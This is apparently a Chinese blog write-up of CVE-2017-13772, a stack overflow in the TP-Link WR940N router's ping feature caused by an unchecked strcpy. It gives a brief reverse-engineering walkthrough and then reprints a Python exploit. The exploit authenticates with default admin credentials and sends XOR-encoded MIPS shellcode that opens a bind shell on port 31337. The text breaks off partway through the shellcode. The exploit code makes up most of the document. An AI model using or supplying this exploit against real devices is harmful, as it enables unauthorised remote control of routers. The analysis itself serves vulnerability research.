### 前言
这个是最近爆出来的漏洞，漏洞编号：[CVE-2017-13772](https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/)
固件链接：
之前使用 `firmadyn` 可以正常模拟运行，但是调试不了，就没有仔细看这个漏洞。今天突然想起 他会启动一个 `ssh`
服务，那我们是不是就可以通过`ssh` 连上去进行调试，正想试试，又不能正常模拟了。。。。。下面看具体漏洞。
### 正文
漏洞位与 管理员用来 `ping` 的功能，程序在获取`ip` 地址时没有验证长度，然后复制到栈上，造成栈溢出。搜索关键字符串 `ping_addr`
定位到函数 `sub_453C50`
获取 `ip` 地址后，把字符串指针放到 `$s6`寄存器，跟下去看看。
传入了`ipAddrDispose`函数，继续分析之：
先调用了 `memset` 初始化缓冲区，然后调用 `strcpy` 把 `ip` 地址复制到栈上，溢出。
利用的话和前文是一样的，经典的栈溢出，经典的 rop。
[一步一步pwn路由器之rop技术实战](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-28-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8Brop%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html)
[一步一步pwn路由器之路由器环境修复&&rop技术分析](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html)
附上参考链接里的 `exp`
    #!/usr/bin/python
    # -*- coding: UTF-8 -*-    import urllib2
    import base64
    import hashlib
    from optparse import *
    import sys
    import urllib
    banner = (
    "___________________________________________________________________________\n"
    "WR940N Authenticated Remote Code Exploit\n"
    "This exploit will open a bind shell on the remote target\n"
    "The port is 31337, you can change that in the code if you wish\n"
    "This exploit requires authentication, if you know the creds, then\n"
    "use the -u -p options, otherwise default is admin:admin\n"
    "___________________________________________________________________________"
    )
    def login(ip, user, pwd):
        print "[+] Attempting to login to http://%s %s:%s"%(ip,user,pwd)
        #### Generate the auth cookie of the form b64enc('admin:' + md5('admin'))
        hash = hashlib.md5()
        hash.update(pwd)
        auth_string = "%s:%s" %(user, hash.hexdigest())
        encoded_string = base64.b64encode(auth_string)
        print "[+] Encoded authorisation: %s" %encoded_string#### Send the request
        url = "http://" + ip + "/userRpm/LoginRpm.htm?Save=Save"
        print "[+] sending login to " + url
        req = urllib2.Request(url)
        req.add_header('Cookie', 'Authorization=Basic %s' %encoded_string)
        resp = urllib2.urlopen(req)
        #### The server generates a random path for further requests, grab that here
        data = resp.read()
        next_url = "http://%s/%s/userRpm/" %(ip, data.split("/")[3])
        print "[+] Got random path for next stage, url is now %s" %next_url
        return (next_url, encoded_string)
    #custom bind shell shellcode with very simple xor encoder
    #followed by a sleep syscall to flush cash before running
    #bad chars = 0x20, 0x00
    shellcode = (
    #encoder
    "\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99"
    "\x27\xb2\x05\x4b" #0x27b2059f for first_exploit
    "\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9"
    "\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41"
    "\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d"
    "\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71"
    "\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d"
    "\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99"
    "\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5"
    "\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad"
    "\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9"
    "\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1"
    "\x02\x2a\x18\x26\xae\x43\xff\xc1"
    #sleep
    "\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08"
    "\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
    "\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c"
    ################ encoded shellcode ###############
    "\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06"
    "\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff"
    "\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d"
    "\x7a\x69"            #